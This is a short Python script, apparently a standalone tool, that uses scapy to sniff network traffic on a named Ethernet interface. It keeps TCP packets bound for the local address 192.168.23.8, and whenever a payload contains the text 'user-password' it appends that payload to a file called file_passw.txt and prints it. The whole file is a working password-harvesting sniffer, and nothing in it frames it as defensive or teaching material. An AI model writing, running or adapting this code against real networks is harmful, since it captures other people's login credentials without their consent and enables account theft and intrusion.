from scapy.all import *
from scapy.packet import Packet


def process_packet(packet: Packet):
  
    if packet.haslayer(TCP):
        if packet[IP].dst == "192.168.23.8":
                if Raw in packet:
                    try:
                        text = packet[Raw].load.decode('utf-8')
                        if "user-password" in text:
                            with open("file_passw.txt", 'a') as f:
                                 f.write(text)
                            print(text)
                    except: 
                         pass

cap = sniff(prn=process_packet, iface="Realtek PCIe GbE Family Controller")
